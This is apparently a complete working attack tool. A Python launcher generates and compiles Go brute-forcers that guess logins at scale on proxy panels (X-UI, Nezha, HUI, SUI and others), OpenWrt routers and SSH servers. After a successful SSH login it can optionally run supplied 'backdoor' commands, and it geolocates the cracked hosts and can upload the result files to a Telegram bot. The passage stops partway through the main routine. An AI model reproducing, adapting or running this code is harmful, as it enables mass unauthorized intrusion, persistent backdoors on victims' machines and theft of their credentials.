# -*- coding: utf-8 -*-
# Final Optimized Version: High-Efficiency & Low Memory Usage
import os
import subprocess
import time
import shutil
import sys
import atexit

try:
    import psutil
    import requests
    from openpyxl import Workbook, load_workbook
except ImportError:
    pass # Will be handled by check_environment

try:
    import readline # For better input experience
except ImportError:
    pass

# =========================== Go Templates (Logic Part Only) ===========================
# Each template now only contains the specific logic (imports, vars, processIP, helpers).
# The high-performance main function will be dynamically added by the Python script.

# Template 1: XUI
XUI_GO_TEMPLATE_1 = '''
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)

var bufferPool = sync.Pool{
	New: func() interface{} { b := make([]byte, 4*1024); return &b },
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConns:        2000,
		MaxIdleConnsPerHost: 1000,
		IdleConnTimeout:     90 * time.Second,
	},
	Timeout: 10 * time.Second,
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := fmt.Sprintf("username=%s&password=%s", username, password)
	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(payload))
	if err != nil { return nil, err }
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()
	select {
	case <-shutdownRequest: return
	case semaphore <- struct{}{}:
	}

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			var resp *http.Response
			var err error

			ctx1, cancel1 := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err = postRequest(ctx1, fmt.Sprintf("http://%s:%s/login", ip, port), user, pass)
			cancel1()

			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err = postRequest(ctx2, fmt.Sprintf("https://%s:%s/login", ip, port), user, pass)
				cancel2()
			}

			if err != nil { continue }

			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, readErr := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				resp.Body.Close()
				if readErr != nil { continue }

				var data map[string]interface{}
				if json.Unmarshal(body, &data) == nil {
					if success, ok := data["success"].(bool); ok && success {
						resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
						return
					}
				}
			} else {
				resp.Body.Close()
			}
		}
	}
}
'''

# Template 2: Nezha Panel
XUI_GO_TEMPLATE_2 = '''
package main
import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{"username": username, "password": password}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil { return nil, err }
	req.Header.Set("Content-Type", "application/json")
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			var resp *http.Response
			var err error
			ctx1, cancel1 := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err = postRequest(ctx1, fmt.Sprintf("http://%s:%s/api/v1/login", ip, port), user, pass)
			cancel1()
			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err = postRequest(ctx2, fmt.Sprintf("https://%s:%s/api/v1/login", ip, port), user, pass)
				cancel2()
			}
			if err != nil { continue }
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, readErr := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				resp.Body.Close()
				if readErr != nil { continue }
				var data map[string]interface{}
				if json.Unmarshal(body, &data) == nil {
					if success, ok := data["success"].(bool); ok && success {
						resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
						return
					}
				}
			} else {
				resp.Body.Close()
			}
		}
	}
}
'''

# Template 3: HUI Panel
XUI_GO_TEMPLATE_3 = '''
package main
import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{"username": username, "pass": password}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil { return nil, err }
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port), user, pass)
			cancel()
			if err != nil { continue }
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, readErr := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				resp.Body.Close()
				if readErr != nil { continue }
				var data map[string]interface{}
				if json.Unmarshal(body, &data) == nil {
					if d, ok := data["data"].(map[string]interface{}); ok {
						if token, exists := d["accessToken"].(string); exists && token != "" {
							resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
							return
						}
					}
				}
			} else {
				resp.Body.Close()
			}
		}
	}
}
'''

# Template 4: Xiandan Panel
XUI_GO_TEMPLATE_4 = '''
package main
import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := map[string]string{"username": username, "password": password}
	jsonPayload, _ := json.Marshal(payload)
	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil { return nil, err }
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/login", ip, port), user, pass)
			cancel()
			if err != nil { continue }
			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, readErr := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				resp.Body.Close()
				if readErr != nil { continue }
				var data map[string]interface{}
				if json.Unmarshal(body, &data) == nil {
					if success, ok := data["success"].(bool); ok && success {
						if d, ok := data["data"].(map[string]interface{}); ok {
							if token, exists := d["token"]; exists && token != "" {
								resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
								return
							}
						}
					}
				}
			} else {
				resp.Body.Close()
			}
		}
	}
}
'''

# Template 5: SUI Panel
XUI_GO_TEMPLATE_5 = '''
package main
import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var bufferPool = sync.Pool{ New: func() interface{} { b := make([]byte, 4*1024); return &b } }
var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	form := fmt.Sprintf("user=%s&pass=%s", username, password)
	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(form))
	if err != nil { return nil, err }
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, fmt.Sprintf("http://%s:%s/app/api/login", ip, port), user, pass)
			cancel()
			if err != nil { continue }
			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, readErr := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				resp.Body.Close()
				if readErr != nil { continue }
				var data map[string]interface{}
				if json.Unmarshal(body, &data) == nil {
					if success, ok := data["success"].(bool); ok && success {
						resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
						return
					}
				}
			} else {
				resp.Body.Close()
			}
		}
	}
}
'''

# Template 6: SSH
XUI_GO_TEMPLATE_6 = '''
package main
import (
	"bufio"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"golang.org/x/crypto/ssh"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var hmSuccessChannel = make(chan string, 100)
var hmFailChannel = make(chan string, 100)

var ENABLE_BACKDOOR = {enable_backdoor}
var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}

func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	client, err := ssh.Dial("tcp", ip+":"+port, config)
	return client, err == nil
}

func deployBackdoor(client *ssh.Client, ip, port, username, password string, cmds []string) {
	defer client.Close()
	session, err := client.NewSession()
	if err != nil {
		hmFailChannel <- fmt.Sprintf("%s:%s %s %s 失败原因: 无法创建session\\n", ip, port, username, password)
		return
	}
	defer session.Close()
	if err := session.Run(strings.Join(cmds, " && ")); err != nil {
		hmFailChannel <- fmt.Sprintf("%s:%s %s %s 失败原因: 后门命令执行失败 - %v\\n", ip, port, username, password, err)
		return
	}
	hmSuccessChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }
	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 { return }
	ip, port := parts[0], parts[1]

	for _, user := range usernames {
		for _, pass := range passwords {
			if client, success := trySSH(ip, port, user, pass); success {
				resultsChannel <- fmt.Sprintf("%s:%s %s %s\\n", ip, port, user, pass)
				if ENABLE_BACKDOOR {
					deployBackdoor(client, ip, port, user, pass, CUSTOM_BACKDOOR_CMDS)
				} else {
					client.Close()
				}
				return
			}
		}
	}
}
'''

# Template 7: Sub Store
XUI_GO_TEMPLATE_7 = '''
package main
import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var httpClient = &http.Client{ Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second }, Timeout: 10 * time.Second }

const successFlag = `{"status":"success","data"`

func sendRequest(ctx context.Context, fullURL string) (bool, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil { return false, err }
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := httpClient.Do(req)
	if err != nil { return false, err }
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), successFlag) {
			return true, nil
		}
	}
	return false, nil
}

func tryProtocols(ipPort, path string) (bool, string) {
	cleanPath := strings.Trim(path, "/") + "/api/utils/env"
	for _, scheme := range []string{"http", "https"} {
		probeURL := fmt.Sprintf("%s://%s/%s", scheme, ipPort, cleanPath)
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		success, _ := sendRequest(ctx, probeURL)
		cancel()
		if success {
			return true, fmt.Sprintf("%s://%s?api=%s://%s/%s\\n", scheme, ipPort, scheme, ipPort, strings.Trim(path, "/"))
		}
	}
	return false, ""
}

func processIP(line string, usernames []string, paths []string) { // usernames is unused, paths are passwords
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	ipPort := strings.TrimSpace(line)
	if ipPort == "" { return }

	for _, path := range paths {
		if success, result := tryProtocols(ipPort, path); success {
			resultsChannel <- result
			return
		}
	}
}
'''

# Template 8: OpenWrt/iStoreOS
XUI_GO_TEMPLATE_8 = '''
package main
import (
	"bufio"
	"context"
	"fmt"
	"net/http"
	"net/url"
	_ "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)
var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var shutdownRequest = make(chan struct{})
var resultsChannel = make(chan string, 256)
var httpClient = &http.Client{
	Transport: &http.Transport{ MaxIdleConns: 2000, MaxIdleConnsPerHost: 1000, IdleConnTimeout: 90 * time.Second },
	Timeout: 10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
}

func postRequest(ctx context.Context, urlStr, username, password, origin, referer string) (*http.Response, error) {
	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
	req, err := http.NewRequestWithContext(ctx, "POST", urlStr, strings.NewReader(payload))
	if err != nil { return nil, err }
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Referer", referer)
	req.Header.Set("Origin", origin)
	return httpClient.Do(req)
}

func processIP(line string, usernames []string, passwords []string) {
	defer func() { atomic.AddInt64(&completedCount, 1); <-semaphore; wg.Done() }()
	select { case <-shutdownRequest: return; case semaphore <- struct{}{}: }

	trimmed := strings.TrimSpace(line)
	if trimmed == "" { return }
	
	schemes := []string{"http", "https"}
	if strings.HasPrefix(trimmed, "http") {
		u, err := url.Parse(trimmed)
		if err != nil { return }
		schemes = []string{u.Scheme}
		trimmed = u.Host
	}

	for _, scheme := range schemes {
		targetURL, _ := url.Parse(fmt.Sprintf("%s://%s/cgi-bin/luci/", scheme, trimmed))
		origin := targetURL.Scheme + "://" + targetURL.Host
		
		for _, user := range usernames {
			for _, pass := range passwords {
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err := postRequest(ctx, targetURL.String(), user, pass, origin, origin+"/")
				cancel()
				if err != nil { continue }
				
				cookies := resp.Cookies()
				resp.Body.Close()
				for _, c := range cookies {
					if c.Name == "sysauth_http" && c.Value != "" {
						resultsChannel <- fmt.Sprintf("%s %s %s\\n", targetURL.String(), user, pass)
						return
					}
				}
			}
		}
	}
}
'''

# =========================== ipcx.py Content ===========================
IPCX_PY_CONTENT = r"""
import requests, time, os, re, sys
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter

def get_ip_info(ip_port, retries=3):
    ip = ip_port.split(':')[0]
    url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp"
    for _ in range(retries):
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    return [ip_port, data.get('country', 'N/A'), data.get('regionName', 'N/A'), data.get('city', 'N/A'), data.get('isp', 'N/A')]
            time.sleep(1.2) # Respect API rate limit
        except requests.exceptions.RequestException:
            time.sleep(1)
    return [ip_port, '查询失败', '查询失败', '查询失败', '查询失败']

def adjust_column_width(ws):
    for col in ws.columns:
        max_len = 0
        for cell in col:
            if cell.value:
                max_len = max(max_len, len(str(cell.value)))
        ws.column_dimensions[get_column_letter(col[0].column)].width = max_len + 2

def print_progress(i, total, start_time, ip):
    if total == 0: return
    elapsed = time.time() - start_time
    rate = i / elapsed if elapsed > 0 else 0
    eta = (total - i) / rate if rate > 0 else 0
    bar = '█' * int(50 * i / total) + '-' * (50 - int(50 * i / total))
    sys.stdout.write(f'\rIP信息查询 |{bar}| {i}/{total} [{time.strftime("%M:%S", time.gmtime(elapsed))}<{time.strftime("%M:%S", time.gmtime(eta))}, {rate:.2f}it/s] {ip}  ')
    sys.stdout.flush()

def process_file(input_file, output_excel):
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"\n文件 {input_file} 未找到，跳过Excel生成。")
        return
    if not lines:
        print("\n结果文件为空，跳过Excel生成。")
        return

    wb = Workbook(); ws = wb.active; ws.title = "IP信息"
    ws.append(['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP'])
    
    start_time = time.time()
    for i, line in enumerate(lines, 1):
        parts = line.split(); addr, user, passwd = (parts + [''] * 3)[:3]
        ip_port = re.search(r'https?://([^/\s]+)', addr)
        ip_port = ip_port.group(1) if ip_port else addr.split()[0]
        
        info = get_ip_info(ip_port)
        ws.append([addr, user, passwd] + info[1:])
        print_progress(i, len(lines), start_time, ip_port)

    adjust_column_width(ws)
    wb.save(output_excel)
    print("\nIP信息查询完成！")

if __name__ == "__main__":
    process_file('xui.txt', 'xui.xlsx')
"""

# =========================== Main Python Script Logic ===========================
GO_EXEC = "/usr/local/go/bin/go"

def input_with_default(prompt, default):
    val = input(f"{prompt}（默认 {default}）：").strip()
    return int(val) if val.isdigit() else default

def input_filename_with_default(prompt, default):
    val = input(f"{prompt}（默认 {default}）：").strip()
    return val if val else default

def to_go_string_array(items: list) -> str:
    if not items: return "[]string{}"
    escaped = [item.replace("\\", "\\\\").replace('"', '\\"') for item in items]
    return "[]string{\"" + "\", \"".join(escaped) + "\"}"

def generate_go_code(template_content, semaphore_size, usernames, passwords, **kwargs):
    COMMON_MAIN_LOGIC = '''
func fileWriter(outputFile string, ch <-chan string, done chan bool) {
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { fmt.Printf("错误: 打开输出文件 %s 失败: %v\\n", outputFile, err); done <- true; return }
	defer file.Close()
	writer := bufio.NewWriter(file)
	defer writer.Flush()
	for result := range ch {
		writer.WriteString(result)
	}
	done <- true
}

func progressReporter(done <-chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	startTime := time.Now()
	for {
		select {
		case <-ticker.C:
			count := atomic.LoadInt64(&completedCount)
			elapsed := time.Since(startTime).Seconds()
			rate := float64(count) / elapsed if elapsed > 0 else 0
			fmt.Printf("\\r进度: 已完成 %d | 速率: %.2f 个/秒 ", count, rate)
		case <-done:
			count := atomic.LoadInt64(&completedCount)
			fmt.Printf("\\n\\n最终完成: %d 个任务\\n", count)
			return
		}
	}
}

func main() {
	go func() { http.ListenAndServe("localhost:6060", nil) }()
	stopSignal := make(chan os.Signal, 1)
	signal.Notify(stopSignal, syscall.SIGINT, syscall.SIGTERM)
	
	if len(os.Args) < 2 { fmt.Println("错误: 请提供输入文件名。用法: ./program <input_file>"); return }
	inputFile := os.Args[1]
	file, err := os.Open(inputFile)
	if err != nil { fmt.Printf("打开输入文件失败: %v\\n", err); return }
	defer file.Close()

	usernames := {user_list}
	passwords := {pass_list}
	if len(usernames) == 0 || len(passwords) == 0 { fmt.Println("用户名或密码列表为空。"); return }

	writerDone := make(chan bool); go fileWriter("xui.txt", resultsChannel, writerDone)
    var hmSuccessDone, hmFailDone chan bool
    if {is_ssh_mode} {
        hmSuccessDone = make(chan bool); go fileWriter("hmsuccess.txt", hmSuccessChannel, hmSuccessDone)
        hmFailDone = make(chan bool); go fileWriter("hmfail.txt", hmFailChannel, hmFailDone)
    }

	progressDone := make(chan struct{}); go progressReporter(progressDone)
	go func() { <-stopSignal; fmt.Println("\\n\\n收到终止信号，正在停止派发新任务..."); close(shutdownRequest) }()

	fmt.Printf("开始处理文件 %s...\\n", inputFile)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		select {
		case <-shutdownRequest: goto END_LOOP
		default:
			if line := strings.TrimSpace(scanner.Text()); line != "" {
				wg.Add(1)
				go processIP(line, usernames, passwords)
			}
		}
	}
	END_LOOP:

	wg.Wait()
	close(resultsChannel); <-writerDone
    if {is_ssh_mode} { close(hmSuccessChannel); <-hmSuccessDone; close(hmFailChannel); <-hmFailDone }
	close(progressDone); time.Sleep(100 * time.Millisecond)
	fmt.Println("\\n处理完成!")
}
'''
    final_code = template_content + COMMON_MAIN_LOGIC
    final_code = final_code.replace("{semaphore_size}", str(semaphore_size)) \
                           .replace("{user_list}", to_go_string_array(usernames)) \
                           .replace("{pass_list}", to_go_string_array(passwords)) \
                           .replace("{is_ssh_mode}", "true" if kwargs.get("is_ssh", False) else "false")
    
    if kwargs.get("is_ssh", False):
        final_code = final_code.replace("{enable_backdoor}", "true" if kwargs.get("install_backdoor", False) else "false")
        final_code = final_code.replace("{custom_backdoor_cmds}", to_go_string_array(kwargs.get("custom_cmds", [])))
                           
    with open('xui.go', 'w', encoding='utf-8') as f: f.write(final_code)

def compile_go_program():
    executable = "xui_executable" + (".exe" if sys.platform == "win32" else "")
    print("--- 正在编译Go程序... ---")
    env = os.environ.copy(); env['GOCACHE'] = '/tmp/.cache/go-build'
    try:
        subprocess.run([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable, 'xui.go'], check=True, capture_output=True, text=True, encoding='utf-8', env=env)
        print(f"--- Go程序编译成功: {executable} ---")
        return executable
    except subprocess.CalledProcessError as e:
        sys.exit(f"--- Go 程序编译失败 ---\n{e.stderr}")

def run_go_program(executable, input_file):
    print(f"--- 正在运行程序处理: {input_file} ---")
    mem_limit = int(psutil.virtual_memory().total * 0.8 / 1024**2)
    print(f"设置Go内存限制为: {mem_limit}MiB")
    env = os.environ.copy(); env["GOMEMLIMIT"] = f"{mem_limit}MiB"; env["GOGC"] = "50"
    
    if sys.platform != "win32": os.chmod(executable, 0o755)
    cmd = ['./' + executable, input_file]
    if sys.platform == "linux": cmd = ["nice", "-n", "10"] + cmd

    try:
        subprocess.run(cmd, env=env)
    except KeyboardInterrupt:
        print("\n--- 手动中断Go程序执行 ---")
    except Exception as e:
        print(f"\n--- 执行Go程序时发生错误: {e} ---")

def clean_temp_files():
    print("--- 正在清理临时文件... ---")
    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f): os.remove(f)

def choose_template_mode():
    modes = ["XUI面板", "哪吒面板", "HUI面板", "咸蛋面板", "SUI面板", "SSH", "Sub Store", "OpenWrt/iStoreOS"]
    print("请选择爆破模式 (所有模式均已优化):")
    for i, mode in enumerate(modes, 1): print(f"{i}. {mode}爆破")
    while True:
        choice = input(f"输入 1-{len(modes)}（默认1）：").strip()
        if choice == "": return 1
        if choice.isdigit() and 1 <= int(choice) <= len(modes): return int(choice)
        print("输入无效。")

def check_environment(template_mode):
    if sys.platform == "win32": return
    print(">>> 正在检查并安装依赖环境...")
    try:
        subprocess.run(["apt-get", "update", "-y"], check=True, capture_output=True)
        subprocess.run(["apt-get", "install", "-y", "python3-pip", "python3-psutil", "curl", "tar"], check=True, capture_output=True)
        if not os.path.exists(GO_EXEC) or b"go1.21" not in subprocess.check_output([GO_EXEC, "version"]):
            print("--- Go环境不满足，正在自动安装... ---")
            subprocess.run(["curl", "-#", "-Lo", "/tmp/go.tar.gz", "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz"], check=True)
            subprocess.run(["rm", "-rf", "/usr/local/go"], check=True)
            subprocess.run(["tar", "-C", "/usr/local", "-xzf", "/tmp/go.tar.gz"], check=True)
        if template_mode == 6:
            print("    - 正在安装SSH模块...")
            env = os.environ.copy(); env['GOCACHE'] = '/tmp/.cache/go-build'
            subprocess.run([GO_EXEC, "get", "golang.org/x/crypto/ssh"], check=True, capture_output=True, env=env)
        print(">>> 环境依赖检测完成 ✅\n")
    except Exception as e:
        sys.exit(f"❌ 环境配置失败: {e}\n请检查apt源或网络后重试。")

def load_credentials(template_mode):
    if template_mode == 7:
        if input("是否使用 password.txt 路径库？(y/N): ").lower() == 'y':
            with open("password.txt", encoding='utf-8') as f: passwords = [l.strip() for l in f if l.strip()]
            return ["dummy"], passwords
        return ["dummy"], ["2cXaAxRGfddmGz2yx1wA"]
    
    if input("是否使用 username.txt / password.txt 字典库？(y/N): ").lower() == 'y':
        with open("username.txt", encoding='utf-8') as u, open("password.txt", encoding='utf-8') as p:
            return [l.strip() for l in u if l.strip()], [l.strip() for l in p if l.strip()]
    return {"3": (["sysadmin"], ["sysadmin"]), "8": (["root"], ["password"])}.get(str(template_mode), (["admin"], ["admin"]))

def send_to_telegram(file_path, bot_token, chat_id):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, "rb") as f:
        try:
            r = requests.post(url, data={'chat_id': chat_id, 'caption': os.path.basename(file_path)}, files={'document': f})
            print(f"✅ 文件 {os.path.basename(file_path)} 发送成功" if r.status_code == 200 else f"❌ TG上传失败: {r.status_code}")
        except Exception as e:
            print(f"❌ 发送到 TG 失败: {e}")

if __name__ == "__main__":
    start = time.time()
    try:
        TEMPLATE_MODE = choose_template_mode()
        check_environment(TEMPLATE_MODE)
        
        kwargs = {"is_ssh": TEMPLATE_MODE == 6}
        if TEMPLATE_MODE == 6 and input("是否在SSH爆破成功后安装后门(命令需存放在后门命令.txt)？(y/N)：").lower() == 'y':
            kwargs["install_backdoor"] = True
            with open("后门命令.txt", encoding='utf-8') as f: kwargs["custom_cmds"] = [l.strip() for l in f if l.strip()]

        print("\n=== 爆破一键启动 ===")
        input_file = input_filename_with_default("请输入源文件名", "1.txt")
        if not os.path.exists(input_file): sys.exit(f"❌ 错误: 文件 '{input_file}' 不存在。")

        semaphore_size = input_with_default("爆破线程数", 1000)
